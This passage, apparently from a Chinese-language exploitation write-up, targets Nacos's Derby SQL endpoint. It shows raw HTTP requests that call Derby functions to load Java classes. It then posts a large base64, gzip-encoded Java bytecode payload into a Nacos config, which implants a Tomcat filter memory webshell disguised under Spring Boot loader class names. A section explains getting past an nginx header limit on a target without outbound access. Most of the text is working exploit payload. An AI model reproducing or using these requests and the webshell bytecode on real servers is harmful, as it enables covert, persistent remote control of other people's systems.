AAAAADQAD%2FAAFBwAcSwcBpQgBwQAAAAYAAgGlAacACQC5ALoAAgG%2FAAAAHQACAAMAAAARKiu4AaxNLAS2ACwsKrYAMLAAAAAAAcEAAAAGAAIBpQGnAAkBVAFVAAIBvwAAAB4AAwAEAAAAEioruAGsTi0EtgAsLSostgGvsQAAAAABwQAAAAQAAQAYAAIAYgBjAAEBvwAAAIEAAwAGAAAANgFNuwF5WbcBek67AbFZLbcBtE0rLLYBuC22Abk6BCzGAAcstgG6GQSwOgUsxgAHLLYBuhkFvwACAAIAHgApAAAAKQArACkAAAABAcAAAAApAAP%2BACYHAbEHAXkHALL%2FAAIAAwcAAgcAFgcBsQABBwAW%2FgAJAAAHABYACAG7ABQAAQG%2FAAAANgACAAAAAAAfpwARABMBvbMAWwOzAFKnAAcAp%2F%2FxALsAAlm3Ab5XsQAAAAEBwAAAAAUAAwMNAwAA%27%29%2Cg%28%29%2Cnull%2Cn%28%27org.springframework.boot.loader.Launcher%27%29%29+as+a+from+config_info+%2F%2Alimit%2A%2F HTTP/1.1
Host: 127.0.0.1:8849
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "macOS"
Sec-Fetch-User: ?1
Cookie: lang=zh-CN; flavor_uv=1; grafana_session=0819560c9c23861c1372c45faded2e95; XSRF-TOKEN=60076405-84b6-42e3-b669-aaada2d50fc8; JSESSIONID=A346858F7C26752E1DC85C37A3276B40; java-chains-token-key=admin_token
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
Accept-Encoding: gzip, deflate, br, zstd


```

![](assets/005.png)


```http
GET /nacos/v1/cs/ops/derby?sql=select+count%28%2A%29+as+b%2C+n%28%27org.springframework.boot.loader.TimeZoneSerializer9c2b6d1b8f654d5d83941e25cfc457d6%27%29+as+a+from+config_info+%2F%2Alimit%2A%2F HTTP/1.1
Host: 127.0.0.1:8849
Sec-Fetch-Mode: navigate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "macOS"
Sec-Fetch-User: ?1
Cookie: lang=zh-CN; flavor_uv=1; grafana_session=0819560c9c23861c1372c45faded2e95; XSRF-TOKEN=60076405-84b6-42e3-b669-aaada2d50fc8; JSESSIONID=A346858F7C26752E1DC85C37A3276B40; java-chains-token-key=admin_token
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
Accept-Encoding: gzip, deflate, br, zstd


```

![](assets/006.png)
![](assets/007.png)

## 实战测试

实际情况并不是 nacos 直连，前置 nginx 1.21.5，stock 8k header buffer，并且不出网（映射 IP 不通无法反弹 shell 去写 ssh），通过再次分析，发现有一个接口能够解决查询接口长度的问题

先查询下函数是否都创建成功

```sql
select alias from sys.sysaliases where alias in ('C','L','P','D','G','N','F') /*limit*/
```

![](assets/008.png)

函数创建成功之后，我们可以预存配置，在里面存储字节码，后续直接调用，成功挂马之后删除即可

```http
POST /nacos/v1/cs/configs HTTP/1.1
Host: 127.0.0.1:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 14555
Connection: close

dataId=testttdb.b64&group=DEFAULT_GROUP&content=yv66vgAAADIBwwEAVG9yZy9zcHJpbmdmcmFtZXdvcmsvYm9vdC9sb2FkZXIvSnNvbk1hcEZvcm1hdFZpc2l0b3JiN2M0MDljMWZiNmU0ZmYyOWU1ZWYyZjFjMDE1Y2YzYgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAAJvawEAAVoBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAIvKggACwEADGdldENsYXNzTmFtZQEALm9yZy5hcGFjaGUuaHR0cC53ZWIuaGFuZGxlcnMuT2hMT2EuRXJyb3JGaWx0ZXIIAA4BAA9nZXRCYXNlNjRTdHJpbmcBC5xINHNJQUFBQUFBQUFBS1ZYZVZ4Ynh4SCtGZ2xXQ0JGaitWUjh0cW1OUUlETUlZekJTUTB5cVVrNDNFQk5NYjBlWWtHeWhhUzg5MlNnZDNyZjkrWFd2WnZTTmowd2FRWEVpVU92cEUzcXBtblNPNzNqTnIzdi9KRmZmNmF6N3owSlhTUi9GQnV0Wm1kbTk1dlpiMmFYKzY3Y2NSRkFFeDVuYUlpcmszNGxvWVRDd2gvVzlZUi9Xb3o1dzBwc1BDcFV6VDhRN2gxUS9OMnFHbGV2ajBSMW9YSXdoaTJubERPS1A2ckVKdjNCcUtKcHZYRmxYS3BzREp1bGFzYXZDZlZNVk9qK3RGTXBnKzIwbUdWdzk2NzVEdXBxSkRiWndWRFZIR29WQjhiYWxFT2h4a0JUVTR2aVFEbURQVUZMTzFCQnJsUGpBWWE5alkzQm82MmRiUWNEYllmYVdocGJtMXVEelFjN2cyMU5yWjFOblFkYXVvSU9YTVhnREFzSnBsK1pFZ3hsbmFHUVNPZ09iR1NvTUJVbmxHaVNOQlU2L1J4cGJHcHVDYlE2c0ptQko1VFpLTVhCc0xFM0x6eEN1RGwvN25EdGRUUmRkamdTaStqWEVVSnZ6UWtYUExqYUNUdDJNRnp0elhjd2M5UmhtdTJTWnJzWkhPTnhNME1NbzZiSFd1b0d6ZkVtY1hOU2FIckhlbG90RVk5cElsOXRyaG9NSzVFWWJjbXd1NmgzOTR6TVRpUWU0M2c2d3lZRGNTVHU3eG5JVWp3anJUQkNHUXFyOFdsbExDbzQ5alBzeTEzVm9NOHgrc2lGenVGbDJQOVVwbVljSExVdVZNRlJqaExVTVpSUEN2MlljV3kwZ3JlUU9qV0ZVeTQwd0YrQkdoeHdZWk81VUJNeExOK09vNFhTSDRySGRFcVJ4ckFqNThEQ2lqb293Y2RDb3FQbXBBdXRPT2hFQUcwbW9tRTFZaHpaTnErMVArWHNPQzFxS1FoQ096b3E0TU5oRnlwTUNFUVJGM2tlVjFUaUpkbTRjTVJFMlVtS01VVVRyUzFIUlNnK1RzemNXaXpPMFM0WGdqanFwS1c2R2RnTThkVTcyblhTbUg4V2pzbjVIaGUyWXB2YzdNYWNlT25JS0lNY2ZReVZvYVNxaXBodVRoR3J2ZGtKTkdjSi9RQ09POUdQWjFPaEUrWWc1VWpNNkZra1p2RGtPR2J6MjRWQkRFbnY1MGhNUkhFbWx5R3NCUTVrK2x5TVNLdVRERHVmalBzY3oyUFk5YVQ4NTNnQm9WcTNCamhlbE1YdnJMUGlHR01vR2UzaUdMZTJrQVpkczdyb1ZGVmxkaUNwSjVJNkhZSlFwamdtbkppVXhiMGhMeEtPQ0RXVW1KanVpV202UXB6SnorekEyQ2tSMGluZzA0ZzZjUXBUT1Fka2FqbmkxRThvWUNXcXlZd1Z1a3NpM2d6VmlRVEl3cUhIVFhMa2I1YXBneVRPU050cEZ5cE5FbEw3TGRlU1k1cmx0dFhiMDFQVThTVjRxV1Q3eXhoS3AyV1c4dUNrT1VtZDdCVjRwUk1oM0NMN2FUeVROV3JkWG9PWnI4WnJaTXBlbStGNGR5ek44VnhDWkxaK1BkNGdHZkZHdWVWNjRONHN3YjJGd0UxRWsxclloYmZKcmh2QzIya21GSTFyd29WM21qUHZvcU1pQWh1M1Y1L1FOR1dTdHE3eDloWnBaOFU3eVh2d1hvbm1mUXhIL3IvdUxITzFGeCtvZ0lLek9mMDBxOUYreUNKRlExS1BSQnU2akh3NThHR3E5SW00ZFozdGU0b1dtSzZyaitKamttWWZwOXRReG04a1hYWGdrM1Q5amhhWWM5eHF0clUrb1lmajQ1bFljM1lwZE12ZVZ4VVRVV0tvMzF5QkFNemhNeExBWnluVzBVSWljOXpHc0gwOWQ0NHZVQ0ZFWW1maXB5bmtRMFVLb2NpU1JhdnRTNWgzNG9zNFQ4VWkrNWlFVFlBS1d4ZVozbzR2eTFyNUNzTlZ3a2pYa0ZWZERpd1NYYlZrckdFcW9vVWF1am9IdTlNMHBvd3V5NUkxQkFjdW1OazIyempwN2lMZHVEQjFkeGV1a2JIN0tsV0hhZGVWbkppUU0xK243QlRybU9hYm8ySmNURVJpd2dwbkd4bm1sbkU2cEh0d3IzeGxmSXNlSjUzZGd3N2NaeEZ2eGg5U1p4TjYzQitNSk1LeUEzNkgxaVRnYTgyclpsMmE1Zm5TTHQvRkEwNWN3dmNZOXVRWWFBa1JvaklJcVVLL1Vjd09rc1R4ZlJlNDJZa2VObzlFZGd6TmhSL0tOaEhBajh4b2luY2FEMzdpeEVQNEtmVVcrZVNTcGoybXBTYm9Wb3ZvczM3YXh6QjlCRCtYa0g1QmxTT2ZWekVsU2ljaDh5bGIwcS93YTZuOFRmNTFrTzd4ajhyTExYT3JaL2QvQzhidm5MaU0zMU5uU1podVN1ajBrS3JJdEcxZjg4dGEwbkQ3QS83b1JEWCtKTHZodEZ5QVd0T2UvSlppM1ZmeDJFUmswbmkwOFhGcUxXcWMrbWtsemNyVDBhM1hhL2xnWkRLbTZFbVZ2dHVEUmt1dE5LRDBLWWtoMmMrSWk1bldvdUZwbEhJN0tBdjB6eW5QZ0w3L2cvNEFLQ0hKS1o4b0dkbEZjbVdXdklIa3FpelpUZkttTEhrTHlmVHFJUG1maHJ5ZFpDYmZ3ZlQ1TDVyWlNDT2pzYlIyRVR2UFEvNUk5UzVMN1NhWEVockxhbjJMMkpQVzd6VUFrNTcxRUd3bnpUM3VXMEZOdTcxdUJiNzJVbzk5QWZYTGFDd2hpait3Sml5Z09ZVkRaM0ducDNRWjF6SzBsMG5kTTVmUlZZSWxYTi9PYXozY2xzSU43WHdCdmZkaXh3V1VqQ3pocGhST0xHTFl3MU1ZdlIyOWM0aGN3T1RJSXNMdERqSkxJZFplN2luM09GTFFoMm0wV3lNM3h4Um1oajFsQzNpeHJhb3FoWmVuOENwUFdhMDBmaDBaM3JDRU54a3pwSmZxdHhwQ0N1K1FIKytldzZaMjd1SEQwb0V2NHYya1BEOEhCNEV1RzY3MzFTM2pnemFjcHl3RThDQWVKdXE0OENnZW81SGgzNVNQUnZCVmVrdzRPRW80bnMveFFnNkZvNGJEeDBHRkpvQW5JT2hSVTczaENVQ09kdnhIcHBrV3ZBYjdVQzd2V1RQRnVKVm1TMm5VV0svN0kwdjRSRitkKzFOc0JaOU80WE4xTkg0K2hZWCsraFJTN2lYN1hUZzFZbk9MUVZMVms1QVlzZFhTOTRVVkJDaHZMZjN1T3d4M21UTzd6RlRLZldlMmk4ZWU1K09icDJoS2NDMDloYzlaY1cxSHlTcUpGQlM5NkFKZ0hPZitpd09jcmhJSlgxTDRISUduaDdBRi9qWUwvT3dhK0l0RndhOVlTQUtGNEFYOUovd0grOTFmeThmL2pXeXZQUHlHbXhYQ0VZS1VFMEpRaGhDUUIyR0cwSndiQXBNdlh5dUVMVFFuUzZDODFtZnpYVnpFdCtlTktqREw2WnRrU3M5N3ExcHVvV2p0TlByYzl5L2h3Zjc2bldmQjdYT3dsMTdBUXlNTCtFRUtQM2JmdjRpZnBmRExlbDhLdjUzdlovTkc5VlhEbThGM0dMWlZLbXU3UVIxQjhDNUpqSmRXSmJpc09mcHlpYTFTWmR1c1NTTVNna1J2b2d3Y0d3RUNXbG1mVlRQOUYzQjVwSDRSai9YNUtJMS9wc3ovaFlyMkhuQ1MvdXF4ejdlWFpvVFN1NDNTMzAxL0FvRitmY1pvSXF5QjdRcjJjMXptb0QvVEFxdGtab0tvcGprSm8vb0trWURhbUt5R1IvQTNLNUdWUnNab0ViT05wTE45RGYzK1BkT1BLbzFkTWtiNEh4WlV0VUFLRVFBQQgAEQEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9UaHJvd2FibGUHABUBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPc3VuLm1pc2MuVW5zYWZlCAAZAQAPamF2YS9sYW5nL0NsYXNzBwAbAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAB0AHgoAHAAfAQAJdGhlVW5zYWZlCAAhAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAIwAkCgAcACUBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAJwEADXNldEFjY2Vzc2libGUBAAQoWilWDAApACoKACgAKwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAAtAC4KACgALwEACWdldE1vZHVsZQgAMQEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMADMANAoAHAA1AQATW0xqYXZhL2xhbmcvT2JqZWN0OwcANwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAOQEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAOwA8CgA6AD0BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAD8AQAoABABBAQARb2JqZWN0RmllbGRPZmZzZXQIAEMBAAZtb2R1bGUIAEUBAA5qYXZhL2xhbmcvTG9uZwcARwEAD2dldEFuZFNldE9iamVjdAgASQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwASwBMCQBIAE0MABMAFAoABABPDAAHAAgJAAIAUQEACmdldENvbnRleHQBABEoKUxqYXZhL3V0aWwvU2V0OwwAUwBUCgACAFUBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAVwoAWABPDAAFAAYJAAIAWgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwAXABdCgBYAF4BAA9jb250ZXh0IGVycm9yOiAIAGABAA9nZXRFcnJvck1lc3NhZ2UBACkoTGphdmEvbGFuZy9UaHJvd2FibGU7KUxqYXZhL2xhbmcvU3RyaW5nOwwAYgBjCgACAGQBAAh0b1N0cmluZwwAZgAKCgBYAGcBAA1qYXZhL3V0aWwvU2V0BwBpAQAHaXNFbXB0eQEAAygpWgwAawBsCwBqAG0BABFjb250ZXh0IG5vdCBmb3VuZAgAbwEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAcQByCwBqAHMBABJqYXZhL3V0aWwvSXRlcmF0b3IHAHUBAAdoYXNOZXh0DAB3AGwLAHYAeAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAegB7CwB2AHwBAApjb250ZXh0OiBbCAB%2BAQAOZ2V0Q29udGV4dFJvb3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwwAgACBCgACAIIBAAJdIAgAhAEACGdldFNoZWxsDACGAC4KAAIAhwEABmluamVjdAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAiQCKCgACAIsBAAFbCACNDAAJAAoKAAIAjwEACF0gcmVhZHkKCACRAQAHZmFpbGVkIAgAkwEAAQoIAJUBABBqYXZhL2xhbmcvU3lzdGVtBwCXAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07DACZAJoJAJgAmwEAJSgpTGphdmEvdXRpbC9TZXQ8TGphdmEvbGFuZy9PYmplY3Q7PjsBABFqYXZhL3V0aWwvSGFzaFNldAcAngoAnwBPAQAQamF2YS9sYW5nL1RocmVhZAcAoQEAEWdldEFsbFN0YWNrVHJhY2VzAQARKClMamF2YS91dGlsL01hcDsMAKMApAoAogClAQANamF2YS91dGlsL01hcAcApwEABmtleVNldAwAqQBUCwCoAKoBAAdnZXROYW1lDACsAAoKAKIArQEAHENvbnRhaW5lckJhY2tncm91bmRQcm9jZXNzb3IIAK8BABBqYXZhL2xhbmcvU3RyaW5nBwCxAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMALMAtAoAsgC1AQAGdGFyZ2V0CAC3AQANZ2V0RmllbGRWYWx1ZQEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DAC5ALoKAAIAuwEABnRoaXMkMAgAvQEACGNoaWxkcmVuCAC%2FAQAGdmFsdWVzAQAYKClMamF2YS91dGlsL0NvbGxlY3Rpb247DADBAMILAKgAwwEAFGphdmEvdXRpbC9Db2xsZWN0aW9uBwDFCwDGAHMBAAZhZGRBbGwBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylaDADIAMkLAGoAygEABlBvbGxlcggAzAEAA2FqcAgAzgEAB2hhbmRsZXIIANABAAVwcm90bwgA0gEAB2FkYXB0ZXIIANQBAAljb25uZWN0b3IIANYBAAdzZXJ2aWNlCADYAQAGZW5naW5lCADaAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwA3ADdCgCiAN4BAA1nZXRTaW1wbGVOYW1lDADgAAoKABwA4QEAEy4rV2ViYXBwQ2xhc3NMb2FkZXIIAOMBAAdtYXRjaGVzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaDADlAOYKALIA5wEACXJlc291cmNlcwgA6QoAHACtAQAEUm9vdAgA7AEACGVuZHNXaXRoDADuAOYKALIA7wEAB2NvbnRleHQIAPEBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAPMA9AsAagD1AQARZ2V0U2VydmxldENvbnRleHQIAPcBAAxpbnZva2VNZXRob2QBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAPkA%2BgoAAgD7AQAOZ2V0Q29udGV4dFBhdGgIAP0KALIAbQEAAygvKQgBAAEAASgIAQIBAAEpCAEEAQAUZ2V0V2ViQXBwQ2xhc3NMb2FkZXIBACsoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAOZ2V0Q2xhc3NMb2FkZXIIAQgBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAQoBAAlnZXRMb2FkZXIIAQwMAQYBBwoAAgEODAANAAoKAAIBEAEACWxvYWRDbGFzcwwBEgAeCgELARMMABAACgoAAgEVAQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwBFwEYCgACARkBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwBGwEcCgACAR0BAAtkZWZpbmVDbGFzcwgBHwEAAltCBwEhAQARamF2YS9sYW5nL0ludGVnZXIHASMJASQATQEAEWdldERlY2xhcmVkTWV0aG9kDAEmADQKABwBJwoAOgArAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMASoBKwoBJAEsAQALbmV3SW5zdGFuY2UMAS4AewoAHAEvAQANZmluZEZpbHRlckRlZggBMQwBCADdCgAcATMBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggBNQEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwCAE3AQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyRGVmCAE5AQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwCAE7AQANc2V0RmlsdGVyTmFtZQgBPQEADnNldEZpbHRlckNsYXNzCAE%2FAQAMYWRkRmlsdGVyRGVmCAFBAQANYWRkVVJMUGF0dGVybggBQwEADXNldFVSTFBhdHRlcm4IAUUBAA5maW5kRmlsdGVyTWFwcwgBRwEAF2phdmEvbGFuZy9yZWZsZWN0L0FycmF5BwFJAQAmKExqYXZhL2xhbmcvQ2xhc3M7SSlMamF2YS9sYW5nL09iamVjdDsMAS4BSwoBSgFMAQAJYXJyYXljb3B5AQAqKExqYXZhL2xhbmcvT2JqZWN0O0lMamF2YS9sYW5nL09iamVjdDtJSSlWDAFOAU8KAJgBUAEACmZpbHRlck1hcHMIAVIBAA1zZXRGaWVsZFZhbHVlAQA5KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWDAFUAVUKAAIBVgEABWFycmF5CAFYAQAwb3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLkFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnCAFaAQAXZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnMBACIoKVtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7DAFcAV0KABwBXgEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwFgCgFhACsBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAS4BYwoBYQFkAQANZmlsdGVyQ29uZmlncwgBZgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAFoAWkLAKgBagEAEGphdmEudXRpbC5CYXNlNjQIAWwBAApnZXREZWNvZGVyCAFuAQAGZGVjb2RlCAFwAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBcgEADGRlY29kZUJ1ZmZlcggBdAEAE2phdmEvaW8vSU9FeGNlcHRpb24HAXYBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBeAoBeQBPAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HAXsBABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwF9AQAFKFtCKVYMABMBfwoBfgGAAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAATAYIKAXwBgwEABHJlYWQBAAUoW0IpSQwBhQGGCgF8AYcBAAV3cml0ZQEAByhbQklJKVYMAYkBigoBeQGLAQALdG9CeXRlQXJyYXkBAAQoKVtCDAGNAY4KAXkBjwEABWNsb3NlDAGRABQKAXwBkgoBeQGSAQBgKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzPCo%2BO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcBlgEADWdldFN1cGVyY2xhc3MMAZgAQAoAHAGZAQASTWV0aG9kIG5vdCBmb3VuZDogCAGbAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAATAZ0KAZcBngEAEltMamF2YS9sYW5nL0NsYXNzOwcBoAEACGdldEZpZWxkAQA%2FKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwGkAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAaYBABIgRmllbGQgbm90IGZvdW5kOiAIAagKAaUBngwBogGjCgACAasBAANzZXQMAa0AigoAKAGuAQATamF2YS9pby9QcmludFN0cmVhbQcBsAEAGShMamF2YS9pby9PdXRwdXRTdHJlYW07KVYMABMBsgoBsQGzAQAPcHJpbnRTdGFja1RyYWNlAQAYKExqYXZhL2lvL1ByaW50U3RyZWFtOylWDAG1AbYKABYBtwoBeQBnCgGxAZIBAAg8Y2xpbml0PgEAAAgBvAoAAgBPAQAEQ29kZQEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zAQAJU2lnbmF0dXJlACEAAgAEAAAAAgAKAAUABgAAAAoABwAIAAAAEgABAAkACgABAb8AAAAPAAEAAQAAAAMSDLAAAAAAAAEADQAKAAEBvwAAAA8AAQABAAAAAxIPsAAAAAAAAQAQAAoAAQG%2FAAAADwABAAEAAAADEhKwAAAAAAABABMAFAABAb8AAAIhAAcACAAAAaMSGrgAIEwrEiK2ACZNLAS2ACwsAbYAME4SHBIyA70AHLYANhIEAcAAOLYAPjoELbYAQhJEBL0AHFkDEihTtgA2OgUZBS0EvQAEWQMSHBJGtgAmU7YAPsAASDoGLbYAQhJKBr0AHFkDEgRTWQSyAE5TWQUSBFO2ADY6BxkHLQa9AARZAxICU1kEGQZTWQUZBFO2AD5XpwAETKcAAwAqtwBQsgBSmQAEsQFMKrYAVkynACRNuwBYWbcAWbIAW7YAXxJhtgBfKiy3AGW2AF%2B2AGizAFsrxgAMK7kAbgEAmQAeuwBYWbcAWbIAW7YAXxJwtgBftgBoswBbpwCfK7kAdAEATSy5AHkBAJkAjyy5AH0BAE67AFhZtwBZsgBbtgBfEn%2B2AF8qLbcAg7YAXxKFtgBftgBoswBbKi23AIg6BCotGQS2AIy7AFhZtwBZsgBbtgBfEo62AF8qtgCQtgBfEpK2AF%2B2AGizAFunACs6BLsAWFm3AFmyAFu2AF8SlLYAXyoZBLcAZbYAXxKWtgBftgBoswBbp%2F9uBLMAUrIAnLIAW1dXsQADAKkArgCxABYBEQFoAWsAFgAAAJQAlwAYAAEBwAAAAFQADPcAlwcAGPwAAAcABAL%2FAAsAAgcAAgcABAAA%2FwAJAAIHAAIHAGoAAQcAFiAMGvwABgcAdv8AaQAEBwACBwBqBwB2BwAEAAEHABb8ACcHAAT4AAIAAQBTAFQAAwG%2FAAACFQACAAwAAAGBuwCfWbcAoEy4AKa5AKsBAE0suQB0AQBOLbkAeQEAmQFhLbkAfQEAwACiOgQZBLYArjoFGQUSsLYAtpkAWhkEEri4ALwSvrgAvBLAuAC8wACoOgYZBrkAxAEAuQDHAQA6BxkHuQB5AQCZACkZB7kAfQEAOggZCBLAuAC8wACoOgkrGQm5AMQBALkAywIAV6f%2F06cA6xkFEs22ALaZAI8ZBRLPtgC2mgCFGQQSuLgAvBK%2BuAC8EtG4ALwS07gAvDoGGQYS1bgAvBLXuAC8Etm4ALwS27gAvDoHGQcSwLgAvMAAqDoIGQi5AMQBALkAxwEAOgkZCbkAeQEAmQApGQm5AH0BADoKGQoSwLgAvMAAqDoLKxkLuQDEAQC5AMsCAFen%2F9OnAFo6BqcAVRkEtgDfxgBNGQS2AN%2B2AEK2AOI6BhkGEuS2AOiZADYZBLYA3xLquAC8OgcZB8YAJRkHtgBCtgDrEu22APCZABUZBxLyuAC8OggrGQi5APYCAFen%2FpwrsAABAKgBIgElABgAAQHAAAAAegAK%2FgAYBwCfBwBqBwB2%2FwBIAAgHAAIHAJ8HAGoHAHYHAKIHALIHAKgHAHYAAC%2F5AAL%2FAF0ACgcAAgcAnwcAagcAdgcAogcAsgcABAcABAcAqAcAdgAAL%2F8AAgAGBwACBwCfBwBqBwB2BwCiBwCyAAEHABgE%2BwBR%2BQACAcEAAAAEAAEAGAHCAAAAAgCdAAIAgACBAAEBvwAAAJkABAAEAAAAYgFNKxL4AQG4APwS%2FgEBuAD8wACyTacABE4rtgBCtgDrTizHAAUtsCy2AP%2BZABi7AFhZtwBZLbYAXxMBAbYAX7YAaLC7AFhZtwBZLbYAXxMBA7YAXyy2AF8TAQW2AF%2B2AGiwAAEAAgAVABgAGAABAcAAAAAdAAT%2FABgAAwcAAgcABAcAsgABBwAYAPwADQcAshsAAgEGAQcAAgG%2FAAAARQAEAAQAAAAlKxMBCQEBuAD8wAELsE0rEwENAQG4APxOLRMBCQEBuAD8wAELsAABAAAADAANABgAAQHAAAAABgABTQcAGAHBAAAABAABABgAAgCGAC4AAgG%2FAAAAzQAGAAcAAACYKiu3AQ9NAU4sKrYBEbYBFE6nAFs6BCq2ARa4ARq4AR46BRMBCxMBIAa9ABxZAxMBIlNZBLIBJVNZBbIBJVO2ASg6BhkGBLYBKRkGLAa9AARZAxkFU1kEA7gBLVNZBRkFvrgBLVO2AD7AABxOuwBYWbcAWbIAW7YAXxKOtgBfLLYAQrYA67YAXxKFtgBftgBoswBbLbYBMLAAAQAIABEAFAAYAAEBwAAAABsAAv8AFAAEBwACBwAEBwELBwAcAAEHABj7AFcBwQAAAAQAAQAYAAEAiQCKAAIBvwAAAmkABwANAAABzCsTATIEvQAcWQMSslMEvQAEWQMqtgERU7gA%2FMYABLErtgBCtgE0OgYZBhMBNrYBFLYBME4ZBhMBOLYBFDoFGQW2ATA6BKcAIjo